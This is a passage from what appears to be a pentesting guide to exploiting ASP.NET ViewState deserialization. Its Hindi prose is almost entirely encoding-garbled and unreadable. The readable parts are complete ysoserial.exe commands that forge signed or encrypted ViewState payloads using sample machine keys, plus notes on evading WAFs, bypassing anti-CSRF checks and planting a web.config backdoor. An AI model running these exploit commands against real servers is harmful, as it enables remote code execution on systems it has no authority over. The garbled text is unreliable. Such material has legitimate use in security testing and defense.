.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
### **.NET Framework <= 4.0 рдХреЗ рд▓рд┐рдП (рдкреБрд░рд╛рдирд╛):**

_рдпрд╣рд╛рдБ рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдФрд░ рдЙрд╕рдХрд╛ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИрдВ:_
```bash
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
```
_рд╡рд┐рднрд┐рдиреНрди рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдЕрд▓рд╛рд╡рд╛, `__VIEWSTATEGENERATOR` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкрде рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп** рдпрд╣ рд╕рдВрднрд╡ рд╣реИ:_
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --generator=93D20A1B --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
_рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ ActivitySurrogateSelector рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ YSoSerial.Net рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ ExploitClass.cs рдХрдХреНрд╖рд╛ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред ViewState payload рдХреЛ рднреА **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** **WAFs рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрдм decryptionKey рдорд╛рдиреНрдпрддрд╛ рд╡рд╛рд▓рд╛ рд╣реЛрддрд╛ рд╣реИ**:_
```bash
.\ysoserial.exe -p ViewState -c "foo to use ActivitySurrogateSelector" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --islegacy --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --isencrypted --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
{% hint style="info" %}
**рдиреЛрдЯ:** YSoSerial.Net рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЧреИрдЬреЗрдЯреНрд╕ рдХреА рдкреНрд░рдХреГрддрд┐ рдХреЗ рдХрд╛рд░рдг, рд▓рдХреНрд╖рд┐рдд ASP.NET рдкреЗрдЬ рд╣рдореЗрд╢рд╛ рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЬрдм рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдПрдХ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
{% endhint %}

### рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрде

рдПрдХ рдорд╛рдиреНрдп ViewState рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрде рдХреА рдЬрдбрд╝ рдЦреЛрдЬрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рдЬрдм рддрдХ:

* рдПрдкреНрд▓рд┐рдХреЗрд╢рди .NET Framework рд╕рдВрд╕реНрдХрд░рдг 4.0 рдпрд╛ рдиреАрдЪреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ; рдФрд░
* `__VIEWSTATEGENERATOR` рдкреИрд░рд╛рдореАрдЯрд░ рдЬреНрдЮрд╛рдд рд╣реЛрддрд╛ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ IIS рдореЗрдВ рдкрде рдкреЗрдбрд╝реА рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ:

![](https://soroush.secproject.com/downloadable/images/aspnetviewstate/iis.png)

рдпрджрд┐ рдЖрдк IIS рдореЗрдВ рд╡рд░реНрдЪреБрдЕрд▓ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╢рдмреНрджреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрд╡рдЧрдд рдирд╣реАрдВ рд╣реИрдВ, рддреЛ рдЖрдк [\[20\]](https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis) рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрдкрд░реЛрдХреНрдд URL рдХреЗ рд▓рд┐рдП рдПрдХ ViewState рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, `--path` рдФрд░ `--apppath` рддрд░реНрдХ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП:
```
--path=/dir1/vDir1/dir2/app1/dir3/app2/vDir2/dir4
--apppath=/app2/
```
рдпрджрд┐ рд╣рдореЗрдВ рдкрддрд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рдХрд┐ "app2" рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдирд╛рдо рд╣реИ, рддреЛ рд╣рдо **рдкреНрд░рдпреЛрдЧ рдФрд░ рддреНрд░реБрдЯрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ URL рдореЗрдВ рд╕рднреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдирд╛рдореЛрдВ рдХреА рдкрд░реАрдХреНрд╖рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдПрдХ-рдПрдХ рдХрд░рдХреЗ, рдЬрдм рддрдХ рд╣рдо рдПрдХ ViewState рдирд╣реАрдВ рдорд┐рд▓рддрд╛ рдЬреЛ рд╕рд░реНрд╡рд░ рдкрд░ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рд╢рд╛рдпрдж DNS рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рдпрд╛ рджреЗрд░реА рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛рдХрд░)ред

### рдЬреЗрдирд░реЗрдЯрд░

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, `--рдЬреЗрдирд░реЗрдЯрд░` рддрд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред `--isdebug` рддрд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЬрдм `--рдкрде` рдФрд░ `--apppath` рддрд░реНрдХ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╣реЛрдВ, рддреЛ рдкреНрд▓рдЧрдЗрди рднреА рд╡рд╣реА рдЧрдгрдХ `__VIEWSTATEGENERATOR` рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЧрдгрдирд╛ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред

## рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХрд╛ рд╢реЛрд╖рдг

рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордп .NET Framework v1.1 рдХреЛ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдЧреИрдЬреЗрдЯ рдкрд╣рдЪрд╛рдирд╛ рдирд╣реАрдВ рдЧрдпрд╛ рдерд╛ред

.NET Framework v4.0 рдпрд╛ рдЙрд╕рд╕реЗ рдиреАрдЪреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЛ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, YSoSerial.Net v2.0 рд╢рд╛рдЦрд╛ [\[21\]](https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/tree/master/ysoserial.net-v2) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рдЕрдиреНрдп рд╢реЛрдз [\[22\]](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/) рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рдХреЗрд╡рд▓ рдХреБрдЫ рд╕рдВрдЦреНрдпрд╛ рдХреЗ рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕рдХреЗ рд▓рд┐рдП рд▓рдХреНрд╖реНрдп рдмреЙрдХреНрд╕ рдореЗрдВ .NET Framework 3.5 рдпрд╛ рдЙрд╕рд╕реЗ рдКрдкрд░ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред

## **рдЕрдиреНрдп рдЙрдкрдХрд░рдг**

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ Immunity Canvas, рдЬрдм рдЬреНрдЮрд╛рдд рд╣реЛрддреЗ рд╣реИрдВ рддреЛ рд╡реЗ рд╡реИрдзреАрдХрд░рдг рдФрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ ViewState рдкреИрд░рд╛рдореАрдЯрд░ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ [\[29\]](https://vimeopro.com/user18478112/canvas/video/260982761)ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ рднреА рдпрд╣реА рд╕рдордп рдкрд░ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬрдм рдореИрдВ рдЕрдкрдирд╛ рдХрд╛рдо рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реЛрдЪ рд░рд╣рд╛ рдерд╛, рдЬреЛ рдХрд╛рдлреА рдЖрд╢реНрдЪрд░реНрдпрдЬрдирдХ рдерд╛:

* [https://github.com/0xACB/viewgen](https://github.com/0xACB/viewgen) (Python рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛)
* [https://github.com/Illuminopi/RCEvil.NET](https://github.com/Illuminopi/RCEvil.NET) (.NET рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛)

рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпреЗ рдЙрдкрдХрд░рдг рд╡рд░реНрддрдорд╛рди рдореЗрдВ **.NET рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЕрдВрддрд░ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рдкреБрд░рд╛рдиреА рдЧреБрдкреНрддрд┐рд▓рд┐рдкрд┐ рдХреЛ рд▓рдХреНрд╖реНрдп рдмрдирд╛рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпреЗ **`ViewStateUserKey`** рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ CSRF рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

# рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрдЭрд╛рд╡

## **GET рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ**

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк GET рдЕрдиреБрд░реЛрдз рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ URL рдореЗрдВ `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ рднреЗрдЬреЗрдВред рдпрд╣рд╛рдВ рдХреЗрд╡рд▓ URL рд▓рдВрдмрд╛рдИ рдХреА рд╕реАрдорд╛ рд╣реИ рдЬреЛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреА рд╣реИред

## **.NET Framework рд╕рдВрд╕реНрдХрд░рдг 4.5 рд╕реЗ рдкрд╣рд▓реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди**

рдкрд╣рд▓реЗ рд╣реА рдХрд╣рд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ .NET Framework 4.0 рдФрд░ рдиреАрдЪреЗ рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ (v2.0 рд╕реЗ v4.0 рдкрд░ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЧрдпрд╛) рдХреЛ рд╢реЛрд╖рд┐рдд рдХрд░рддреЗ рд╕рдордп `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЬрдм `ViewStateEncryptionMode` рд╕рдВрдкрддреНрддрд┐ рдХреЛ `Always` рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред ASP.NET рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ ViewState рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдЕрдиреБрд░реЛрдз рдореЗрдВ `__VIEWSTATEENCRYPTED` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЦреЛрдЬрдХрд░ (рдЗрд╕рдХреЗ рдкрд╛рд╕ рдХреЛрдИ рдорд╛рди рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ)ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб ViewStated рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП `__VIEWSTATEENCRYPTED` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЕрдиреБрд░реЛрдз рд╕реЗ рд╣рдЯрд╛ рдХрд░ рднреЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рднреА рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЬрдм рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреБрдВрдЬреА рдпрд╛ рдЗрд╕рдХреЗ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдЬрдм рдЬрд╛рд╕реВрд╕реА рдХреБрдВрдЬреА рдФрд░ рдЗрд╕рдХреЗ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ рдЪреЛрд░реА рдХрд░ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рддреЛ рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИред

WAFs рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## **рдПрдВрдЯреА-CSRF (рдПрдВрдЯреА-XSRF) рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЛ рдЫрд▓рдирд╛**

рдЬрдм рдПрдХ рдЕрд╡реИрдз `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ ASP.NET рдкреЗрдЬ рддреНрд░реБрдЯрд┐ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдкреГрд╖реНрда рдЕрдкрдиреЗ рдЗрдирдкреБрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдХреЛрдб рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ `Request.Form` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `Request.Form["txtMyInput"]` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `txtMyInput.Text` рдХреЗ рдмрдЬрд╛рдпред **CSRF рд╣рдорд▓рд╛ рдЙрд╕ рдЕрдиреБрд░реЛрдз рд╕реЗ `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╣рдЯрд╛рдХрд░ рдпрд╛ рдЕрд╡реИрдз рдорд╛рди рдХреЗ рд╕рд╛рде `__PREVIOUSPAGE` рдкреИрд░рд╛рдореАрдЯрд░ рдЬ
```markup
<asp:TextBox runat="server" ID="myinput" />
```
рдЬрдм `__EVENTVALIDATION` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрднрд┐рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЕрдиреБрд░реЛрдз рдореЗрдВ `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдорд╛рди рдЦрд╛рд▓реА рд╣реЛ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдореМрдЬреВрдж рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

.NET Framework 4.5 рдФрд░ рдЙрд╕рд╕реЗ рдКрдкрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `Purpose` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдорд╛рдиреНрдп рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрд▓рдЧ рд╣реЛрддрд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ .NET Framework рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд `Purpose` рд╕реНрдЯреНрд░рд┐рдВрдЧ рджрд┐рдЦрд╛рдИ рдЧрдИ рд╣реИ:

| **рдЗрдирдкреБрдЯ рдкреИрд░рд╛рдореАрдЯрд░**                                          | **Purpose рд╕реНрдЯреНрд░рд┐рдВрдЧ**                                 |
| ------------------------------------------------------------ | -------------------------------------------------- |
| тАЬ\_\_VIEWSTATEтАЭ                                              | WebForms.HiddenFieldPageStatePersister.ClientState |
| тАЬ\_\_EVENTVALIDATIONтАЭ                                        | WebForms.ClientScriptManager.EventValidation       |
| P2 in P1\|P2 in тАЬ\_\_dvтАЭ + ClientID + тАЬ\_\_hiddenтАЭ           | WebForms.DetailsView.KeyTable                      |
| P4 in P1\|P2\|P3\|P4 in тАЬ\_\_CALLBACKPARAMтАЭ                  | WebForms.DetailsView.KeyTable                      |
| P3 in P1\|P2\|P3\|P4 in тАЬ\_\_gvтАЭ + ClientID + тАЬ\_\_hiddenтАЭ   | WebForms.GridView.SortExpression                   |
| P4 in P1\|P2\|P3\|P4 in тАЬ\_\_gvтАЭ + ClientID + тАЬ\_\_hiddenтАЭ   | WebForms.GridView.DataKeys                         |

рдКрдкрд░ рджреА рдЧрдИ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рд╕рднреА рдЗрдирдкреБрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рджрд┐рдЦрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рди рдкрд░ рдирд┐рд╢рд╛рдирд╛ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## **`__PREVIOUSPAGE` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ**

рдЬрдм рдЕрдиреБрд░реЛрдз рдореЗрдВ **`__PREVIOUSPAGE`** рдкреИрд░рд╛рдореАрдЯрд░ рдореМрдЬреВрдж рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдореЗрдВ **рдЕрдорд╛рдиреНрдп** рдбреЗрдЯрд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** **`__VIEWSTATE`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝** рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред `__CALLBACKID` рдкреИрд░рд╛рдореАрдЯрд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рд╕реЗ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## **рддреНрд░реБрдЯрд┐ рдХреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛**

рдкрд╣рд▓реЗ рд╕реЗ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХрднреА-рдХрднреА рд╣рдо рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдЙрддреНрдкрдиреНрди ViewState рдорд╛рдиреНрдп рд╣реИред ASP.NET рдПрдХ рдЕрдорд╛рдиреНрдп `__VIEWSTATEGENERATOR` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ MAC рд╕рддреНрдпрд╛рдкрди рддреНрд░реБрдЯрд┐ рдирд╣реАрдВ рджрд┐рдЦрд╛рддрд╛ рд╣реИред рдпрд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдмрджрд▓ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм `ViewStateUserKey` рд╕рдВрдкрддреНрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ ASP.NET рдЕрдм MAC рд╕рддреНрдпрд╛рдкрди рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЛ рджрдмрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, ASP.NET рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди `ViewStateUserKey` рд╕рдВрдкрддреНрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рднреА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рд╕рд╛рде MAC рд╕рддреНрдпрд╛рдкрди рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░ рд╕рдХрддреА рд╣реИ:
```markup
<appSettings>
<add key="aspnet:AlwaysIgnoreViewStateValidationErrors" value="true" />
</appSettings>
```
# Web.config рдХреЛ рдПрдХ рдкрд┐рдЫрд╡рд╛рдбрд╝рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреА рдореВрд▓ рд░реВрдЯ рдореЗрдВ **`web.config`** рдХреЛ **рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рд╡реЗ рд╕рд░реНрд╡рд░ рдкрд░ рдХреЛрдб рдХреЛ **рдЖрд╕рд╛рдиреА рд╕реЗ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдкрд░ рдПрдХ рдЫрд┐рдкреА рд╣реБрдИ рдкрд┐рдЫрд╡рд╛рдбрд╝рд╛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдирд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ **MAC рд╕рддреНрдпрд╛рдкрди рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдХреЗ** рдФрд░ `viewStateEncryptionMode` рд╕рдВрдкрддреНрддрд┐ 